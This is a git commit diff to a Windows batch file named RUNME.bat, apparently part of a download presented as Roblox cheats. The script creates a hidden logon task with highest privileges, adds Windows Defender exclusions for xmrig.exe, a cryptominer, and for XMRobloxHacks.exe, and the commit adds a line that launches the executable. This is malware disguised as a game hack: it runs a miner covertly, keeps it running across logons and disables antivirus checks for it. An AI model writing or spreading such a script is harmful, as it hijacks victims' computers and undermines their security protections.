33b46088f596e36b542c2b6435032d933d1c9432
Marcolino-svg <ferromarco1010@outlook.it>
2026-07-16 17:57:58 +0200

    Update RUNME.bat

--- RUNME.bat
+++ RUNME.bat
@@ -5,4 +5,5 @@ copy config.json C:\hacks
 schtasks /create /tn "ROBLOX" /tr "C:\hacks\XMRobloxHacks.exe" /sc onlogon /rl highest /f
 powershell -Command "Add-MpPreference -ExclusionProcess 'xmrig.exe'"
 powershell -Command "Add-MpPreference -ExclusionProcess 'XMRobloxHacks.exe'"
+C:/hack/XMRobloxHacks.exe
 exit
